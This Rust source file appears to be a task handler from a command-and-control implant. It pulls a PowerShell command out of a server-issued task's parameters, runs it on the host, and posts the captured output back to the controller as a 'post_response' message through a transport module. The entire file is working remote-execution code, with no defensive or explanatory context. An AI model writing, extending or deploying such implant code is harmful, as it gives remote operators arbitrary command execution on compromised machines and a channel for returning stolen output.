use std::process::Command;
use serde_json::Value;

pub fn handle_ps_command(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // extract parameters JSON
    let raw_params = task.get("parameters")
        .ok_or("missing parameters")?
        .as_str()
        .ok_or("parameters is not a string")?;
    let params: Value = serde_json::from_str(raw_params)?;
    let ps_cmd = params.get("arg1")
        .and_then(Value::as_str)
        .ok_or("missing arg1")?;

    // run PowerShell
    let output = Command::new("powershell")
        .args(&["-NoProfile", "-Command", ps_cmd])
        .output()?;

    let user_output = if output.status.success() {
        String::from_utf8_lossy(&output.stdout).trim_end().to_string()
    } else {
        String::from_utf8_lossy(&output.stderr).trim_end().to_string()
    };

    // build and send response
    let response = serde_json::json!({
        "action": "post_response",
        "responses": [{
            "task_id": task.get("id").and_then(Value::as_str).unwrap_or(""),
            "user_output": user_output,
            "timestamp": task.get("timestamp").and_then(Value::as_f64).unwrap_or(0.0),
            "status": "success"
        }]
    });
    crate::transport::send_request(&response.to_string())?;
    Ok(())
}
